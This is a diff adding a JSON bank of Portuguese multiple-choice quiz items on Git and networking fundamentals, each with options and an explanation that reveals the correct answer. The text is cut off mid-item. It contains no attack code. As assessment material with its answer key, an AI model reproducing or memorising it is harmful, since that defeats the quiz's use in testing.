@@ -1,0 +1,974 @@
+[
+  {
+    "id": "git-basics-staged-snapshot",
+    "title": "O que é commitado após editar de novo um arquivo em stage",
+    "question": "Você edita app.js, roda `git add app.js`, edita app.js de novo e roda `git commit` (sem -a). Qual versão de app.js é commitada?",
+    "options": [
+      "A versão mais recente que está na working tree",
+      "A versão que existia quando você rodou git add",
+      "As duas versões, registradas em dois commits",
+      "Nenhuma, porque o arquivo mudou depois do stage"
+    ],
+    "explanation": "git commit registra o index (staging area), e git add copia o conteúdo do arquivo para o index naquele momento. As edições posteriores ficam apenas na working tree até você adicioná-las de novo; git commit -a faria o stage das modificações rastreadas antes, e é por isso que a versão mais nova não é usada aqui."
+  },
+  {
+    "id": "git-basics-gitignore-tracked",
+    "title": "Arquivo ignorado ainda aparece como modificado",
+    "question": "Você adiciona `.env` ao .gitignore, mas o `git status` ainda mostra alterações em .env. O que está acontecendo?",
+    "options": [
+      ".gitignore só passa a valer depois que o próprio arquivo .gitignore é commitado",
+      "Os padrões do .gitignore precisam de uma barra inicial para casar com arquivos",
+      ".env já é rastreado; rode git rm --cached .env para a regra valer",
+      "O Git mantém as regras de ignore em cache até você rodar git gc"
+    ],
+    "explanation": "O gitignore só impede que arquivos não rastreados sejam adicionados; arquivos que já estão no index continuam rastreados, não importa o que digam os padrões. git rm --cached remove o arquivo do index mantendo-o no disco e, depois desse commit, a regra de ignore passa a valer. Commitar o .gitignore, barras iniciais e gc não têm relação com esse comportamento."
+  },
+  {
+    "id": "git-basics-detached-head-commits",
+    "title": "Commits feitos em detached HEAD",
+    "question": "Você roda `git checkout v1.2.0`, faz dois commits e depois `git switch main`. O que acontece com esses dois commits?",
+    "options": [
+      "Nenhum branch aponta para eles; só o reflog os mantém até o gc",
+      "Eles são anexados automaticamente à main quando você volta para ela",
+      "A tag v1.2.0 avança e passa a apontar para o mais novo dos dois commits",
+      "Eles nunca existiram, pois o Git se recusa a commitar em detached HEAD"
+    ],
+    "explanation": "Fazer checkout de uma tag deixa o HEAD em estado detached: novos commits são criados, mas nenhuma ref de branch aponta para eles. Ao sair dali, nada os referencia além do reflog do HEAD, então eles acabam sendo removidos, a menos que você crie um branch (git switch -c fix <sha>). Tags nunca se movem sozinhas, e o Git permite commits em detached HEAD."
+  },
+  {
+    "id": "git-merge-fast-forward",
+    "title": "Merge quando a main não andou",
+    "question": "Você criou o branch `feature` a partir da main e a main não recebeu novos commits desde então. O que `git merge feature` na main faz por padrão?",
+    "options": [
+      "Cria um merge commit com dois pais para registrar a integração",
+      "Faz squash de todos os commits de feature em um novo commit na main",
+      "Faz rebase dos commits de feature sobre a main, com novos hashes",
+      "Faz fast-forward da main até a ponta de feature, sem merge commit"
+    ],
+    "explanation": "Quando o branch atual é ancestral do branch que está sendo mesclado, o Git pode simplesmente avançar a ref: não há nada para combinar. Um merge commit só é criado quando os históricos divergiram ou quando --no-ff é usado; squash e rebase exigem comandos explícitos."
+  },
+  {
+    "id": "git-merge-no-ff",
+    "title": "Manter os merges de features visíveis no histórico",
+    "question": "Seu time quer que toda feature mesclada apareça como uma unidade distinta no histórico, mesmo quando um fast-forward seria possível. Qual comando de merge garante isso?",
+    "options": [
+      "git merge --no-ff feature",
+      "git merge --ff-only feature",
+      "git merge --squash feature",
+      "git merge -s ours feature"
+    ],
+    "explanation": "--no-ff sempre cria um merge commit, então os commits da feature ficam agrupados sob ele e a feature inteira pode ser revertida com um único revert -m. --ff-only faz o oposto (recusa qualquer coisa que não seja fast-forward), --squash descarta totalmente a topologia do branch e -s ours joga fora as mudanças da feature."
+  },
+  {
+    "id": "git-merge-ours-strategy-vs-option",
+    "title": "-s ours versus -X ours",
+    "question": "Qual é a diferença entre `git merge -s ours topic` e `git merge -X ours topic`?",
+    "options": [
+      "-s ours resolve só os trechos em conflito com o nosso lado; -X ours descarta todas as mudanças de topic",
+      "São equivalentes; -X é apenas a forma abreviada da estratégia -s ours",
+      "-s ours ignora todas as mudanças de topic; -X ours só favorece nosso lado nos conflitos",
+      "-s ours mantém o lado de topic nos conflitos; -X ours mantém o lado do branch atual"
+    ],
+    "explanation": "A estratégia de merge ours registra um merge, mas mantém a árvore atual intacta, ignorando tudo do outro branch. A opção de estratégia ours (-X ours) é passada para a estratégia padrão ort: as mudanças sem conflito de topic continuam sendo mescladas, e só os trechos em conflito favorecem o branch atual. Confundir as duas descarta trabalho silenciosamente."
+  },
+  {
+    "id": "git-merge-rerere",
+    "title": "Reaproveitando resoluções de conflito registradas",
+    "question": "Um branch de longa duração é mesclado e rebaseado repetidamente com a main, e você continua resolvendo os mesmos conflitos à mão. Qual recurso do Git registra suas resoluções e as reaplica automaticamente?",
+    "options": [
+      "git mergetool com a flag --auto",
+      "rerere, via rerere.enabled=true",
+      "git rebase --autosquash",
+      "merge.conflictStyle definido como diff3"
+    ],
+    "explanation": "O rerere (reuse recorded resolution) guarda a pré-imagem e a pós-imagem de cada conflito resolvido e reaplica a resolução quando o mesmo conflito aparece de novo, em merges ou rebases. --autosquash só reordena commits fixup!, conflictStyle só muda a aparência dos marcadores e o mergetool apenas abre uma ferramenta externa."
+  },
+  {
+    "id": "git-rebase-shared-branch",
+    "title": "Rebase de um branch que outros já baixaram",
+    "question": "Você fez rebase de `feature`, que dois colegas já tinham baixado, e deu force-push. Que problema os colegas enfrentam?",
+    "options": [
+      "As working trees deles são resetadas e as mudanças não commitadas se perdem",
+      "O remoto rejeita o próximo fetch até eles apagarem e clonarem o repositório",
+      "Nenhum; o Git casa commits reescritos por patch-id no fetch e sincroniza",
+      "Os branches deles ainda têm os commits antigos, e um pull simples duplica o trabalho"
+    ],
+    "explanation": "O rebase cria novos commits com novos hashes. Os branches dos colegas continuam baseados nos originais, então um pull padrão mescla os dois históricos e as mesmas mudanças aparecem duas vezes (muitas vezes com conflitos). Eles precisam se recuperar com git pull --rebase ou git rebase --onto, como explica a seção RECOVERING FROM UPSTREAM REBASE do git-rebase; fetches nunca são rejeitados e as working trees não são tocadas."
+  },
+  {
+    "id": "git-rebase-force-with-lease",
+    "title": "Por que usar --force-with-lease depois de um rebase",
+    "question": "Depois de fazer rebase do branch do seu PR, você precisa dar force-push. Por que `git push --force-with-lease` é preferível a `--force`, e o que ainda pode anulá-lo?",
+    "options": [
+      "Ele guarda os commits remotos antigos numa ref de backup; apagar essa ref o anula",
+      "Ele só força quando o CI passou nos novos commits; pular o CI o anula",
+      "Ele faz o rebase do branch no servidor; uma regra de branch protegido o anula",
+      "Ele falha se o remoto mudou desde seu último fetch; fetches em segundo plano o anulam"
+    ],
+    "explanation": "--force-with-lease compara a ref remota com sua ref de rastreamento remoto e recusa o push se alguém tiver feito push nesse meio-tempo. Se uma IDE ou um cron job fizer fetch em segundo plano, sua ref de rastreamento já inclui o commit da outra pessoa, então o lease passa e você sobrescreve o trabalho mesmo assim; --force-if-includes (ou um sha esperado explícito) fecha essa brecha. Não tem nada a ver com backups, CI ou rebase no servidor."
+  },
+  {
+    "id": "git-rebase-onto",
+    "title": "Transplantando um branch com --onto",
+    "question": "`feature` foi criado a partir de `old-base` (que ainda não foi mesclado), e não da main. Você quer reaplicar na main apenas os commits próprios de feature. Qual comando faz isso?",
+    "options": [
+      "git rebase main feature",
+      "git rebase --onto main old-base feature",
+      "git rebase --onto old-base main feature",
+      "git rebase -i main old-base"
+    ],
+    "explanation": "git rebase --onto <newbase> <upstream> <branch> pega os commits em upstream..branch (os commits próprios de feature) e os reaplica sobre newbase. Um git rebase main feature simples também reaplicaria os commits de old-base que não estão na main, e os argumentos trocados moveriam o intervalo errado para a base errada."
+  },
+  {
+    "id": "git-rebase-range-diff",
+    "title": "Revisando o que mudou entre duas versões rebaseadas",
+    "question": "Você fez rebase de um PR de 6 commits sobre uma main que avançou 40 commits e ajustou dois commits ao resolver conflitos. Um revisor quer ver só como sua série mudou, sem as mudanças do upstream. O que ele deve usar?",
+    "options": [
+      "git range-diff entre os intervalos base..tip antigo e novo",
+      "git diff entre a ponta antiga e a ponta nova do branch do PR",
+      "git log --cherry-mark na diferença simétrica das duas pontas",
+      "git diff --merge-base da ponta antiga até a ponta nova"
+    ],
+    "explanation": "O range-diff emparelha os commits de duas versões de uma série e mostra o diff entre os patches de cada par, então as mudanças do upstream que vieram com a nova base ficam de fora. Um diff simples entre as pontas inclui os 40 commits do upstream, e o cherry-mark só marca quais commits têm patch equivalente, sem mostrar como diferem."
+  },
+  {
+    "id": "git-remotes-fetch-effect",
+    "title": "O que o git fetch altera",
+    "question": "O que `git fetch origin` faz com o branch local que está em checkout?",
+    "options": [
+      "Faz merge de origin/main no branch atual",
+      "Faz rebase do branch atual sobre origin/main",
+      "Nada; só atualiza refs como origin/main",
+      "Reseta o branch atual para igualar ao remoto"
+    ],
+    "explanation": "O fetch baixa objetos e atualiza as refs em refs/remotes/origin/, sem tocar nos seus branches locais, no index ou na working tree. git pull é um fetch seguido de merge (ou rebase, dependendo da configuração); resetar exigiria um git reset explícito."
+  },
+  {
+    "id": "git-remotes-pull-rebase",
+    "title": "Fazer o pull usar rebase em vez de merge",
+    "question": "Sua main local tem 2 commits sem push e origin/main tem 3 commits novos. Qual configuração faz o `git pull` reaplicar seus commits sobre origin/main em vez de criar um merge commit?",
+    "options": [
+      "pull.ff=only",
+      "merge.ff=false",
+      "pull.rebase=true",
+      "fetch.prune=true"
+    ],
+    "explanation": "pull.rebase=true faz o pull rodar git rebase depois do fetch, gerando um histórico linear. pull.ff=only recusaria aqui porque os branches divergiram, merge.ff=false força merge commits e fetch.prune só apaga refs de rastreamento remoto obsoletas."
+  },
+  {
+    "id": "git-undo-reset-soft",
+    "title": "Efeito de reset --soft HEAD~1",
+    "question": "O que `git reset --soft HEAD~1` faz?",
+    "options": [
+      "Volta o branch um commit e deixa as mudanças fora do stage na working tree",
+      "Volta o branch um commit e descarta totalmente as mudanças desse commit",
+      "Cria um novo commit que desfaz as mudanças do último commit",
+      "Volta o branch um commit e deixa as mudanças desse commit em stage"
+    ],
+    "explanation": "--soft só move a ref do branch, então o index e a working tree ainda contêm as mudanças do commit desfeito, prontas para serem commitadas de novo. --mixed (o padrão) também reseta o index, deixando as mudanças fora do stage, --hard reseta tudo, e criar um commit inverso é o que o git revert faz."
+  },
+  {
+    "id": "git-undo-revert-pushed",
+    "title": "Desfazendo um commit que já está na main compartilhada",
+    "question": "Um commit com bug foi enviado para a main compartilhada há uma hora, e vários colegas já fizeram pull dele. Qual é a forma mais segura de desfazê-lo?",
+    "options": [
+      "Resetar a main para o commit anterior e dar force-push",
+      "Reverter o commit com git revert e fazer push",
+      "Fazer amend no commit removendo o bug e dar force-push",
+      "Removê-lo com um rebase interativo e dar force-push"
+    ],
+    "explanation": "git revert adiciona um novo commit que inverte o problemático, então o histórico só avança e o clone de ninguém é invalidado. Reset, amend e rebase interativo reescrevem histórico publicado, obrigando cada colega a consertar seus branches locais e arriscando perda de trabalho."
+  },
+  {
+    "id": "git-undo-reflog-recover",
+    "title": "Recuperando commits depois de reset --hard",
+    "question": "Você rodou `git reset --hard HEAD~3` em um branch local e percebeu que precisava desses três commits. Como recuperá-los?",
+    "options": [
+      "Achar a ponta antiga no git reflog e resetar para ela, ex.: HEAD@{1}",
+      "Rodar git revert HEAD~3 para restaurar os três commits removidos",
+      "Não dá; reset --hard apaga os objetos de commit imediatamente",
+      "Fazer pull da origin, pois reset --hard nunca afeta o histórico commitado"
+    ],
+    "explanation": "reset --hard só move o ponteiro do branch; os commits continuam no banco de objetos, e o reflog registra para onde o HEAD e o branch apontavam antes. O revert criaria commits inversos de um histórico mais antigo, e o pull só ajuda se os commits já tivessem sido enviados. Os objetos só são removidos após a expiração do reflog e o gc."
+  },
+  {
+    "id": "git-undo-pushed-secret",
+    "title": "Você enviou um segredo válido",
+    "question": "Há uma hora você enviou para um repositório público no GitHub um commit contendo uma chave de acesso de nuvem válida. Qual é a primeira ação correta?",
+    "options": [
+      "Revogar e rotacionar a chave, depois removê-la do histórico e coordenar a reescrita",
+      "Reverter o commit para que a chave não apareça mais na ponta do branch",
+      "Reescrever o histórico com git filter-repo, dar force-push e rotacionar a chave se os logs mostrarem uso indevido",
+      "Tornar o repositório privado, o que remove a chave de forks e caches"
+    ],
+    "explanation": "Depois de um push público, considere o segredo comprometido: scrapers automatizados encontram chaves em minutos, e clones, forks e páginas em cache podem já tê-la. A rotação é a única ação que realmente a neutraliza. Um revert deixa a chave no histórico, reescrever o histórico não alcança cópias existentes e tornar o repositório privado não remove forks nem clones."
+  },
+  {
+    "id": "git-undo-remerge-after-revert",
+    "title": "Mesclando de novo um branch depois de reverter seu merge",
+    "question": "Você reverteu o merge de `feature` na main com `git revert -m 1 M`. Depois de corrigir feature com dois commits novos, você faz o merge de novo, mas a maior parte das mudanças originais não aparece na main. Por quê, e o que resolve?",
+    "options": [
+      "A flag -m 1 exclui esse branch de merges para sempre; recrie feature com outro nome",
+      "O segundo merge usou a estratégia ort, que pula trechos revertidos; use -s recursive",
+      "Os commits revertidos foram coletados pelo gc; faça cherry-pick deles do remoto",
+      "Os commits antigos já contam como mesclados; reverta o revert e depois faça o merge"
+    ],
+    "explanation": "Reverter um merge desfaz suas mudanças, mas não desfaz o histórico: os commits antigos de feature continuam sendo ancestrais da main, então o próximo merge só traz os commits posteriores à antiga base de merge. Reverter o revert restaura essas mudanças antes do merge das correções, como descreve a documentação do revert. Não existe lista de bloqueio, o ort não rastreia reverts e os commits continuam alcançáveis."
+  },
+  {
+    "id": "git-adv-cherry-pick-hotfix",
+    "title": "Fazendo backport de uma correção para um branch de release",
+    "question": "O commit de correção abc123 entrou na main. Você precisa exatamente dessa correção em release/2.3, sem nenhum outro commit da main, e quer rastreabilidade. O que você roda em release/2.3?",
+    "options": [
+      "git merge --no-ff main",
+      "git rebase main release/2.3",
+      "git cherry-pick -x abc123",
+      "git revert abc123"
+    ],
+    "explanation": "O cherry-pick aplica a mudança introduzida por um único commit como um novo commit, e -x acrescenta '(cherry picked from commit abc123)' à mensagem para rastreabilidade. Fazer merge ou rebase com a main traria todos os outros commits, e o revert aplicaria o inverso da correção."
+  },
+  {
+    "id": "git-adv-stash-untracked",
+    "title": "O que o git stash deixa para trás",
+    "question": "Você tem arquivos rastreados modificados e um novo arquivo não rastreado config.local, e roda `git stash`. Qual é o estado depois?",
+    "options": [
+      "As mudanças rastreadas e o config.local vão juntos para o stash",
+      "Só as mudanças rastreadas vão para o stash; config.local fica",
+      "As mudanças vão para o stash e config.local é apagado do disco",
+      "O git stash se recusa a rodar se houver arquivos não rastreados"
+    ],
+    "explanation": "Por padrão, o git stash salva apenas mudanças em arquivos rastreados (index e working tree). Arquivos não rastreados ficam intactos, a menos que você passe --include-untracked (-u), ou --all para incluir também os ignorados. Nada é apagado, e arquivos não rastreados não impedem o stash."
+  },
+  {
+    "id": "git-adv-annotated-tag",
+    "title": "Tags anotadas versus tags leves",
+    "question": "O que diferencia uma tag anotada de uma tag leve (lightweight)?",
+    "options": [
+      "Uma tag anotada avança sozinha conforme novos commits entram no branch",
+      "É um objeto próprio, com autor da tag, data, mensagem e assinatura opcional",
+      "Só tags anotadas podem ir para o remoto; tags leves ficam apenas locais",
+      "Uma tag anotada só pode apontar para merge commits, e não para commits comuns"
+    ],
+    "explanation": "git tag -a cria um objeto de tag que guarda quem criou a tag, quando, uma mensagem e, opcionalmente, uma assinatura GPG/SSH; uma tag leve é só uma ref apontando para um commit. Nenhum dos dois tipos se move, ambos podem ser enviados e ambos podem apontar para qualquer commit. Tags de release geralmente devem ser anotadas."
+  },
+  {
+    "id": "git-adv-bisect-run",
+    "title": "Encontrando uma regressão entre 1.000 commits",
+    "question": "Uma regressão apareceu em algum ponto dos últimos 1.000 commits. Você tem um script test.sh que sai com 0 quando o comportamento está bom e 1 quando está ruim. Qual é a abordagem mais eficiente?",
+    "options": [
+      "git log -S com o nome da função que falha e inspecionar cada commit encontrado",
+      "git blame no arquivo que falha e testar cada commit listado",
+      "git bisect start <bad> <good> e depois git bisect run ./test.sh",
+      "Fazer cherry-pick de cada commit sobre a última versão boa e rodar o teste"
+    ],
+    "explanation": "O bisect faz uma busca binária no histórico, então 1.000 commits exigem cerca de log2(1000), ou seja, uns 10 testes, e o bisect run automatiza isso usando o código de saída do script (125 marca um commit como impossível de testar). Pickaxe e blame só acham commits que mexeram em determinado texto, que podem não ser a causa, e fazer cherry-pick de cada commit é linear e propenso a erros."
+  },
+  {
+    "id": "git-wf-squash-merge-reuse-branch",
+    "title": "Reutilizando um branch depois de um squash merge",
+    "question": "Seu PR foi mesclado com o 'Squash and merge' do GitHub. Você continua trabalhando no mesmo branch e abre um novo PR, que agora mostra seus commits antigos e conflitos. Por quê?",
+    "options": [
+      "O squash merge apaga o histórico do branch no servidor, deixando commits órfãos",
+      "O GitHub exige um force-push no branch depois de cada squash merge",
+      "O squash merge reescreve commits anteriores da main, mudando a base do seu branch",
+      "O commit de squash não tem ligação com os originais, que parecem não mesclados"
+    ],
+    "explanation": "O squash cria um único commit novo na main com as mudanças combinadas, mas sem ligação de parentesco com os commits do seu branch; do ponto de vista do Git, seus commits originais continuam não mesclados. A solução é começar o novo trabalho a partir de uma main atualizada (ou usar rebase --onto). O squash merge não apaga histórico nem reescreve a main."
+  },
+  {
+    "id": "git-wf-branch-protection",
+    "title": "Exigindo checks e revisões antes do merge",
+    "question": "Qual recurso do GitHub permite exigir status checks aprovados e pelo menos uma revisão aprovando antes de qualquer merge na main?",
+    "options": [
+      "Regras de proteção de branch (ou rulesets) na main",
+      "Um arquivo CODEOWNERS na raiz do repositório",
+      "Configurações de merge definidas no .gitattributes",
+      "Um hook pre-commit commitado no repositório"
+    ],
+    "explanation": "Branches protegidos aplicam requisitos de merge no servidor: status checks obrigatórios, revisões obrigatórias, histórico linear e mais. O CODEOWNERS apenas designa revisores (e só é aplicado quando a proteção exige revisão de code owner), o .gitattributes controla merge drivers e hooks do lado do cliente podem ser ignorados."
+  },
+  {
+    "id": "git-wf-merge-queue",
+    "title": "Dois PRs verdes que juntos quebram a main",
+    "question": "Dois PRs passam no CI contra a main, mas depois que ambos são mesclados o build quebra por causa da interação entre eles. Qual recurso do GitHub foi feito para evitar isso?",
+    "options": [
+      "Exigir histórico linear na main, para que não haja merge commits",
+      "Exigir commits assinados para verificar cada mudança na main",
+      "Uma merge queue que testa cada PR com a main e os PRs à frente",
+      "Descartar aprovações antigas quando novos commits são enviados"
+    ],
+    "explanation": "Cada PR foi testado contra uma main que não incluía o outro PR. Uma merge queue monta branches temporários com a main mais recente e os PRs na fila, e só faz o merge quando essa combinação passa. Histórico linear, commits assinados e descartar aprovações não testam o resultado combinado."
+  },
+  {
+    "id": "nw-models-transport-layer",
+    "title": "Camada que usa números de porta",
+    "question": "No modelo TCP/IP, qual camada fornece comunicação fim a fim entre processos e os identifica por números de porta?",
+    "options": [
+      "Camada de internet",
+      "Camada de enlace",
+      "Camada de aplicação",
+      "Camada de transporte"
+    ],
+    "explanation": "TCP e UDP ficam na camada de transporte e usam portas de origem e destino para multiplexar várias conversas entre os mesmos dois hosts. A camada de internet (IP) move pacotes entre hosts pelo endereço, a camada de enlace cuida do meio local e as aplicações ficam acima do transporte."
+  },
+  {
+    "id": "nw-models-ping-ok-curl-fails",
+    "title": "Ping funciona, mas o HTTPS dá timeout",
+    "question": "`ping api.internal` funciona, mas `curl https://api.internal` fica travado até dar timeout. Qual conclusão é mais bem fundamentada?",
+    "options": [
+      "A conectividade IP funciona; a porta TCP 443 deve estar filtrada ou sem nada ouvindo",
+      "A resolução de nomes está quebrada, pois o curl resolve nomes de outra forma que o ping",
+      "O link físico está oscilando, o que o ping não detecta mas o TCP detecta",
+      "O certificado TLS do servidor expirou, o que faz a conexão travar"
+    ],
+    "explanation": "Um ping bem-sucedido mostra que o nome foi resolvido e que pacotes ICMP trafegam nos dois sentidos na camada de rede. Um travamento (e não uma recusa ou erro de TLS) normalmente significa que os SYNs TCP para a porta 443 estão sendo descartados silenciosamente por um firewall ou security group. Um certificado expirado gera um erro imediato no handshake, não um timeout."
+  },
+  {
+    "id": "nw-ip-usable-hosts-26",
+    "title": "Hosts utilizáveis em uma /26",
+    "question": "Quantos endereços de host utilizáveis uma sub-rede IPv4 /26 tradicional oferece?",
+    "options": [
+      "64",
+      "62",
+      "30",
+      "126"
+    ],
+    "explanation": "Uma /26 deixa 32 - 26 = 6 bits de host, o que dá 2^6 = 64 endereços. O endereço de rede e o de broadcast não podem ser atribuídos a hosts, sobrando 62. 30 corresponde a uma /27 e 126 a uma /25."
+  },
+  {
+    "id": "nw-ip-same-subnet-check",
+    "title": "O destino está no mesmo enlace?",
+    "question": "O host A é 10.0.1.100/25 e quer enviar um pacote para 10.0.1.200. O que A faz?",
+    "options": [
+      "Faz ARP direto por 10.0.1.200, pois os dois endereços estão em 10.0.1.0/24",
+      "Envia ao gateway: .200 está em 10.0.1.128/25, outra sub-rede",
+      "Descarta o pacote, pois uma rede /25 não roteia para outras sub-redes",
+      "Faz broadcast para 10.0.1.255 para que o host de destino o receba"
+    ],
+    "explanation": "Uma /25 divide 10.0.1.0/24 em 10.0.1.0-127 e 10.0.1.128-255. A aplica a própria máscara, vê que o destino está fora do enlace e encaminha para o gateway. Assumir uma /24 é o erro clássico; hosts nunca fazem broadcast de tráfego unicast para alcançar outros hosts."
+  },
+  {
+    "id": "nw-ip-overlapping-vpc-cidrs",
+    "title": "Peering com um CIDR sobreposto",
+    "question": "Sua VPC usa 10.0.0.0/16 e um parceiro pede peering com a VPC dele, que usa 10.0.128.0/17. Qual é o problema?",
+    "options": [
+      "Uma /17 é uma rede maior que uma /16, então o parceiro precisa reduzir o range antes",
+      "Ranges da RFC 1918 não podem ser roteados entre redes de organizações diferentes",
+      "Os ranges se sobrepõem; o roteamento fica ambíguo sem NAT ou renumeração",
+      "Nada; o longest-prefix match roteia o tráfego corretamente nos dois sentidos"
+    ],
+    "explanation": "10.0.128.0/17 é a metade superior de 10.0.0.0/16. O peering exige ranges sem sobreposição e, mesmo quando um roteador aceita, o longest-prefix match mandaria para o parceiro o tráfego destinado aos seus próprios hosts 10.0.128.x. Uma /17 é menor que uma /16, e ranges privados podem ser roteados de forma privada entre organizações."
+  },
+  {
+    "id": "nw-tcp-three-way-handshake",
+    "title": "Estabelecimento de conexão TCP",
+    "question": "Qual é a sequência correta do three-way handshake do TCP?",
+    "options": [
+      "SYN, ACK, SYN-ACK",
+      "SYN, ACK, FIN",
+      "ACK, SYN, SYN-ACK",
+      "SYN, SYN-ACK, ACK"
+    ],
+    "explanation": "O cliente envia SYN com seu número de sequência inicial, o servidor responde com SYN-ACK levando o próprio número de sequência e confirmando o do cliente, e o cliente confirma com ACK o do servidor. Os dois lados passam a ter números de sequência sincronizados; FIN é usado no encerramento."
+  },
+  {
+    "id": "nw-tcp-time-wait-exhaustion",
+    "title": "Acúmulo de TIME_WAIT em chamadas de saída",
+    "question": "Um serviço abre uma nova conexão HTTP por requisição para um backend. Sob carga, ele mostra dezenas de milhares de sockets em TIME_WAIT e erros como 'cannot assign requested address'. Qual é a correção mais eficaz?",
+    "options": [
+      "Reutilizar conexões com keep-alive e um connection pool",
+      "Reduzir o listen backlog do backend para aliviar a carga",
+      "Desativar o algoritmo de Nagle no cliente com TCP_NODELAY",
+      "Aumentar a janela de recepção TCP do servidor"
+    ],
+    "explanation": "O lado que fecha primeiro mantém a conexão em TIME_WAIT por duas vezes o tempo máximo de vida de um segmento, e cada uma prende uma porta de origem para aquele destino. Abrir e fechar uma conexão por requisição esgota o range de portas efêmeras. O pooling elimina essa rotatividade; backlog, Nagle e tamanho de janela não afetam o consumo de portas."
+  },
+  {
+    "id": "nw-udp-real-time-voice",
+    "title": "Por que chamadas de voz usam UDP",
+    "question": "Por que aplicações de voz e vídeo em tempo real costumam transportar mídia via UDP em vez de TCP?",
+    "options": [
+      "O UDP garante a entrega com menos overhead de cabeçalho que o TCP",
+      "Conexões TCP não atravessam roteadores NAT domésticos de forma confiável",
+      "O TCP trava tudo numa retransmissão, e áudio atrasado é inútil",
+      "O payload UDP é criptografado por padrão, enquanto o do TCP não é"
+    ],
+    "explanation": "O TCP precisa entregar os bytes em ordem, então um pacote perdido bloqueia tudo o que vem atrás até ser retransmitido, aumentando o jitter. Para mídia ao vivo é melhor pular o pacote perdido e disfarçar a lacuna. O UDP não garante entrega nem fornece criptografia, e o TCP funciona bem através de NAT."
+  },
+  {
+    "id": "nw-tcp-pmtud-black-hole",
+    "title": "Respostas grandes travam em uma VPN",
+    "question": "Em um novo túnel VPN, o SSH funciona e páginas pequenas carregam, mas downloads HTTPS grandes travam para sempre. Um firewall no caminho descarta todo ICMP. Qual é a causa provável?",
+    "options": [
+      "Um black hole de path MTU discovery causado pelo ICMP descartado",
+      "O window scaling do TCP está desativado, então transferências acima de 64 KB são recusadas",
+      "Os session tickets do TLS expiram no meio de downloads longos",
+      "O algoritmo de Nagle segura os segmentos finais de respostas grandes"
+    ],
+    "explanation": "Túneis adicionam cabeçalhos e reduzem o MTU efetivo. O TCP liga o Don't Fragment e depende das mensagens ICMP 'fragmentation needed' para descobrir o path MTU menor; se um firewall as descarta, os segmentos de tamanho máximo somem enquanto pacotes pequenos passam. As correções são liberar esse tipo de ICMP ou fazer clamping do TCP MSS no túnel. O window scaling limita a vazão, não causa travamentos."
+  },
+  {
+    "id": "nw-dns-cname-apex",
+    "title": "CNAME no apex da zona",
+    "question": "Seu provedor de DNS não deixa você criar um CNAME para o próprio example.com apontando para o hostname de um load balancer. Por quê?",
+    "options": [
+      "Registros CNAME só funcionam para nomes com pelo menos três labels",
+      "O DNSSEC exige que o apex seja um registro A para poder ser assinado",
+      "Registradores proíbem CNAME no apex para proteger o domínio de sequestro",
+      "Um CNAME não coexiste com outros dados, e o apex precisa de SOA e NS"
+    ],
+    "explanation": "Um CNAME declara que um nome é um alias, então nenhum outro dado pode existir nesse nome. O apex da zona sempre tem registros SOA e NS, então um CNAME no apex quebraria a zona. Os provedores contornam isso com flattening ALIAS/ANAME ou com os registros mais novos HTTPS/SVCB; número de labels, DNSSEC e registradores não são o motivo."
+  },
+  {
+    "id": "nw-dns-ttl-migration",
+    "title": "Planejando a troca de IP com DNS",
+    "question": "Você vai mover uma API para um novo endereço IP. O registro A dela tem TTL de 86400 segundos. Qual é o plano certo?",
+    "options": [
+      "Trocar o registro e limpar seu próprio resolver; todos os clientes atualizam em minutos",
+      "Baixar o TTL um dia antes, trocar o registro e manter o IP antigo até os caches expirarem",
+      "Colocar TTL 0 no momento da troca para que todo cache busque de novo na hora",
+      "Trocar os registros NS, porque mudanças de delegação ignoram os caches dos resolvers"
+    ],
+    "explanation": "Os resolvers podem manter a resposta antiga em cache pelo TTL completo que receberam, então o TTL menor só ajuda depois que o TTL antigo de 24 horas expirou em todo lugar. Mudar o TTL na hora da troca não afeta quem já tem o registro em cache, limpar seu próprio resolver não ajuda os outros, e registros NS também ficam em cache, muitas vezes com TTLs longos."
+  },
+  {
+    "id": "nw-dns-negative-caching",
+    "title": "Hostname novo ainda retorna NXDOMAIN",
+    "question": "Um script consultou new.example.com logo antes de você criar o registro. Agora o registro existe, mas aquele resolver continua retornando NXDOMAIN por um tempo. Por quê?",
+    "options": [
+      "Respostas NXDOMAIN ficam em cache até o processo do resolver ser reiniciado",
+      "Registros novos sempre levam até 48 horas para se propagar pelo registrador",
+      "O TTL do novo registro A precisa terminar a contagem antes de ficar visível",
+      "Resolvers guardam NXDOMAIN em cache por um tempo definido pelo SOA da zona"
+    ],
+    "explanation": "O cache negativo permite que resolvers lembrem que um nome não existe, pelo menor valor entre o TTL do registro SOA e seu campo MINIMUM. Até isso expirar, o resolver não pergunta de novo. Registradores não participam de registros dentro da sua zona, e o TTL de um registro só controla por quanto tempo a resposta positiva fica em cache."
+  },
+  {
+    "id": "nw-dns-tcp-fallback",
+    "title": "Consultas DNSSEC falham atrás de um firewall",
+    "question": "A resolução de um domínio assinado com DNSSEC, com respostas grandes, falha de forma intermitente a partir de uma rede cujo firewall só permite saída UDP na porta 53. Outras redes resolvem normalmente. O que está acontecendo?",
+    "options": [
+      "Respostas grandes vêm truncadas (bit TC) e a nova tentativa via TCP/53 é bloqueada",
+      "A validação DNSSEC exige a porta 853, que esse firewall não libera",
+      "Checksums UDP ficam inválidos em mensagens DNS maiores que 512 bytes",
+      "O firewall remove as assinaturas DNSSEC, então os resolvers rejeitam as respostas"
+    ],
+    "explanation": "Quando uma resposta excede o tamanho de payload UDP negociado via EDNS, o servidor liga o bit de truncamento e o cliente precisa tentar de novo via TCP. O suporte a TCP é obrigatório em implementações de DNS, então bloquear TCP/53 quebra justamente essas respostas grandes. A porta 853 é do DNS over TLS, não do DNSSEC, e a validade do checksum não depende do tamanho."
+  },
+  {
+    "id": "nw-http-cache-private",
+    "title": "CDN entregou a página de um usuário para outro",
+    "question": "Atrás de uma CDN, um usuário relatou ter visto a página de conta de outro usuário. A resposta tinha `Cache-Control: public, max-age=600` e era renderizada a partir do cookie de sessão. Qual é a correção certa?",
+    "options": [
+      "Adicionar Vary: Accept-Encoding para cada cliente ter sua cópia",
+      "Marcar respostas personalizadas com Cache-Control: private ou no-store",
+      "Adicionar um ETag para a CDN revalidar a página com a origem",
+      "Servir a página via HTTP/2 para cada resposta usar seu próprio stream"
+    ],
+    "explanation": "public permite que caches compartilhados, como CDNs, armazenem a resposta e a entreguem a qualquer um que peça a mesma URL. private restringe o armazenamento ao navegador do usuário, e no-store proíbe o cache por completo. Vary: Accept-Encoding continua compartilhando entre usuários, um ETag só habilita revalidação, e streams HTTP/2 não têm relação com cache."
+  },
+  {
+    "id": "nw-http3-head-of-line",
+    "title": "Por que o HTTP/3 ajuda em redes com perda",
